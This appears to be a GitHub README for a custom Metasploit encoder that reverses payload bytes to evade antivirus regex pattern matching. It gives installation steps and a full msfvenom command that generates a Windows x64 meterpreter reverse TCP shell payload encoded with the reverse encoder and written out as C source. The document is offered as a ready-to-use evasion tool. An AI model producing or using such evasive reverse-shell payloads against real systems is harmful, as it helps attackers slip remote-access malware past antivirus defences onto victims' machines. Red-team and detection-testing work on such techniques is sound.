# Metasploit_ReverseEncoder
Generic Metasploit Encoder that simply reverses the payload to avoid AV RegEx Pattern Matching 

## Setup
Place the reverse.rb file inside "/usr/share/metasploit-framework/modules/encoders/generic" folder.

## Sample Usage

Try this to verify that Metasploit finds the encoder:
	msfvenom --list encoders

The resulting output should contain the following line

	generic/reverse              normal     Reverse Encoder


Now encode your payload with -e generic/reverse, eg;

	msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=wlan0 LPORT=4444 -e generic/reverse -f c -o reversePayload.h

## Limitations:

This encoder only works with Framework Transform Formats (see msfvenom --list formats) and you need to provde your own decode as part of the payload executable creatiion